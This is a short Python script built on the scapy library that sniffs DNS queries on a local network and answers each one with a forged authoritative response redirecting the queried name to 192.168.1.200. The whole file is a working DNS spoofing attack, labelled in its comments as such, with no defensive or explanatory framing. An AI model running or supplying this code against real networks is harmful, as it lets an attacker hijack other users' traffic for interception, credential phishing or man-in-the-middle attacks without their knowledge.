from scapy.all import *
import random

# Fake DNS response function
def dns_attack(packet):
    if packet.haslayer(DNS) and packet[DNS].qr == 0:  # If it's a DNS request
        spoofed_response = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                           UDP(dport=packet[UDP].sport, sport=53) / \
                           DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd, 
                               an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata="192.168.1.200"))
        send(spoofed_response)
        print(f"Spoofed response sent for {packet[DNS].qd.qname}")

# Sniff for DNS queries and respond with spoofed IP
sniff(filter="udp port 53", prn=dns_attack, store=0)
